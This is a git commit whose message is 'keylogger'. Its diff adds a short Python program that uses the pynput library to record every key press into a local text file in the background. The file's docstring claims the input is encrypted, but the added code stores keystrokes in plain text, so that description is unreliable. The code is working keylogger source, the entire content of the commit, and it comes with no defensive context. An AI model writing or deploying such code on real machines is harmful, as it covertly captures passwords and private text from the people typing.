46028746407e3cec1f9d61deb6870c01663fbae0
Abie Safdie <abie@Abies-MacBook-Air.local>
2024-01-31 16:31:28 -0800

    keylogger

--- keylogger.py
+++ keylogger.py
@@ -3,4 +3,20 @@ Keylogging program that encrypts user input and then decrypted once
 received by the OS
 """
 
+from pynput import keyboard
 
+file_path = "./keyboard_log.txt"
+
+
+def trackKey(letter):
+    with open(file_path, "a") as file:
+        try:
+            file.write(letter.char)
+            file.write("\n")
+        except:
+            file.write("Error getting letter\n")
+
+if __name__ == '__main__':
+    listener = keyboard.Listener(on_press=trackKey)
+    listener.start()
+    input()
